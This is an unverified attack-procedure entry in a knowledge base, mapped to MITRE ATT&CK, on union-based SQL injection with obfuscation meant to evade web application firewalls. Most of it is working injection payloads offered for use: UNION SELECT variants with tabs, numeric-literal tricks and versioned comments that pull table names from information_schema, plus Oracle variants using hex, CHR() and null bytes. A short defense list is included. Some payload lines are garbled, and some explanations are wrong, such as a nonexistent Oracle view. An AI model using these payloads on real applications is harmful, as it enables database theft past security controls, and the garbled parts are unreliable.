---
id: b6f3ce84-f27e-4cb1-9990-658de9928dda
name: SQL Injection with Union-Based Technique and Obfuscation by DBMS
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:36.803147+00:00'
updated_at: '2023-04-10T20:24:20.288153+00:00'
tactics:
- '[[Defense Evasion|TA0005 - Defense Evasion]]'
- '[[Lateral Movement|TA0008 - Lateral Movement]]'
techniques:
- '[[Exploitation of Remote Services|T1210 - Exploitation of Remote Services]]'
- '[[Obfuscated Files or Information|T1027 - Obfuscated Files or Information]]'
tags:
- '[[Obfuscation by DBMS]]'
- '[[SQL Injection]]'
- '[[WAF Bypass]]'
commands:
- '[[UNION SELECT]]'
---

# SQL Injection with Union-Based Technique and Obfuscation by DBMS

## Summary

SQL Injection with Union-Based Technique and Obfuscation by DBMS is an attack that exploits vulnerabilities in web applications that use SQL databases. Attackers can use this technique to bypass WAFs and gain access to sensitive data. The attack involves injecting malicious SQL code into a web appl

## Description

# Description

SQL Injection with Union-Based Technique and Obfuscation by DBMS is an attack that exploits vulnerabilities in web applications that use SQL databases. Attackers can use this technique to bypass WAFs and gain access to sensitive data. The attack involves injecting malicious SQL code into a web application's input fields to manipulate the database and extract sensitive information. Union-based technique is used to combine the results of two or more SELECT statements into a single result set. Obfuscation by DBMS is used to hide the malicious SQL code in the database, making it difficult for security tools to detect the attack. This attack can be devastating for businesses as it can lead to data theft, financial loss, and damage to reputation.

 

## Requirements

1. Access to a vulnerable web application

1. Knowledge of SQL Injection and Union-Based Technique

1. Tools for SQL Injection, such as SQLMap or Havij

 

## Defense

1. Use parameterized queries to prevent SQL Injection attacks

1. Regularly update and patch web applications to prevent vulnerabilities

1. Implement WAFs and other security measures to detect and prevent attacks

 

## Objectives

1. Extract sensitive information from the database

1. Bypass WAFs and other security measures

1. Gain unauthorized access to the system

 

# Instructions

1. The Union SQL Injection is a technique that allows an attacker to inject malicious SQL code into a vulnerable SQL statement. The attacker uses the UNION operator to combine the result sets of two or more SELECT statements into a single result set. The UNION operator requires that the number of columns in the SELECT statements be the same.

 



**Code**: [[1.UNION	SELECT	2	
3.2UNION	SELECT	2	
1e0UNION	SELE]]



> The commands in the data field are examples of how an attacker can use the UNION operator to inject malicious code in a SQL statement. The SELECT statements in the commands are retrieving data from the database. The injected code is retrieving data from other tables in the database. The attacker can use this technique to extract sensitive information from the database or to modify the contents of the database. It is important to sanitize user input and to use prepared statements to prevent SQL injection attacks.



**Command** ([[UNION SELECT]]):

```bash
1.UNION	SELECT	2	
3.2UNION	SELECT	2	
1e0UNION	SELECT	2	
SELECT\N/0.e3UNION	SELECT	2	
1e1AND-0.0UNION	SELECT	2	
1/*!12345UNION/*!31337SELECT/*!table_name*/	
{ts	1}UNION	SELECT.``	1.e.table_name	
SELECT	$.``	1.e.table_name	
SELECT{_	.``1.e.table_name}	
SELECT	LightOS	.	``1.e.table_name	LightOS	
SELECT	information_schema 1337.e.tables	13.37e.table_name	
SELECT	1	from	information_schema 9.e.table_name
```



2. The SQL Union-based Injection attack is a technique used by attackers to inject malicious code into a SQL query. It involves using the UNION operator to combine the results of two or more SELECT statements into a single result set. The attacker can then use this to extract sensitive information from the database or to perform other malicious actions.

 



**Code**: [[.1UNION	SELECT	2	
1.UNION	SELECT.2alias	
1e0UNION	]]



> The various commands in the 'data' field are used to perform the SQL Union-based Injection attack. The 'UNION SELECT' command is used to combine the results of two SELECT statements into a single result set. The 'FROM table' command is used to specify the table from which to retrieve data. The 'WHERE' clause is used to filter the data based on certain conditions. The 'AND' and '=' operators are used to specify the conditions. The 'information_schema' database is a special database in SQL that contains information about the database schema, including tables, columns, and indexes. The 'table_name' field is used to specify the name of the table to retrieve information from.

3. This command extracts table names from an Oracle database using SQL injection techniques.

 



**Code**: [[1FUNION	SELECT	2	
1DUNION	SELECT	2	
SELECT	0x74616]]



> The 'UNION SELECT' statement is used to combine the results of two or more SELECT statements into a single result set. In this case, the '1FUNION' and '1DUNION' statements are used to inject the malicious code. The 'SELECT 0x7461626c655f6e616d65 FROM all_tab_tables' statement extracts the table name 'table_name' from the 'all_tab_tables' system table. The 'SELECT CHR(116) || CHR(97) || CHR(98) FROM all_tab_tables' statement concatenates the ASCII characters for 't', 'a', and 'b' to form the table name 'tab'. The 'SELECT%00table_name%00FROM%00all_tab_tables' statement extracts the table name 'table_name' using null bytes as separators. These techniques can be used by attackers to extract sensitive information from an Oracle database.

## MITRE ATT&CK Mapping

### Tactics

- [[Defense Evasion|TA0005 - Defense Evasion]]
- [[Lateral Movement|TA0008 - Lateral Movement]]

### Techniques

- [[Exploitation of Remote Services|T1210 - Exploitation of Remote Services]]
- [[Obfuscated Files or Information|T1027 - Obfuscated Files or Information]]

## Commands Used

- [[UNION SELECT]]

## Tags

- [[Obfuscation by DBMS]]
- [[SQL Injection]]
- [[WAF Bypass]]


